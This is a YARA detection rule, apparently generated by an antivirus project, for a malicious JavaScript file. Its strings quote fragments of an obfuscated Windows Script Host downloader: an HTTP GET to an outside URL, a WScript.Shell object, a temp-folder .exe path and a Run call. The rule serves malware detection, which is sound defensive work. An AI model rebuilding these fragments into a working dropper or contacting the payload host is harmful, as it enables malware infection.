rule sig_20160401_a0a307a71c60eb18aaeaa78ea0c98186 {
  meta:
    description = "datamaliciousorder - file 20160401_a0a307a71c60eb18aaeaa78ea0c98186.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d577b04269f82e8c7b3259ce9006e2ff5254e13ac78d10a97375a2224932d512"

  strings:
    $s1  = "UpdInr[QmSc](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "function RzRll(DkiRj, UmXx){AsgFo = AsgFo * 1; return DkiRj - UmXx;};" fullword ascii
    $s3  = "var WgaTs = function AczGp() {return WScript[UfCzq](\"WScript\"+\".Shell\");}(), EqyMeu = 11;" fullword ascii
    $s4  = "if (UpdInr[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ButVv(){return XgiGb + \"\";};" fullword ascii
    $s6  = "function MyVqj() {return WgaTs[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"DOlbS45Vjr.ex\" + \"e\";};" fullword ascii
    $s7  = "function DeZog() {return ((KaXd == true) && (KaXd == IgzJkx)) ? 1 : AsgFo;};" fullword ascii
    $s8  = "IgzJkx = true; " fullword ascii
    $s9  = "var LalFl = false;" fullword ascii
    $s10 = "}while (YoVfm);" fullword ascii
    $s11 = "function DhuDpy(DdyOgg){WgaTs[\"R\"+\"un\"](DdyOgg, AsgFo, AsgFo);};" fullword ascii
    $s12 = "var KaXd = false;" fullword ascii
    $s13 = "function YnRk(){return UfCzq;};" fullword ascii
    $s14 = "function OsZsj()" fullword ascii
    $s15 = "var FcEhg = new this[\"Date\"]();" fullword ascii
    $s16 = "function WoIzk(){return 23;};" fullword ascii
    $s17 = "return RzRll(HcqSl, FuYr);" fullword ascii
    $s18 = "var IgzJkx = false;" fullword ascii
    $s19 = "KaXd = true; " fullword ascii
    $s20 = "function BsgBh(WoxTm) {var XfwXw = (1, 2, 3, 4, 5, WoxTm); return XfwXw;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}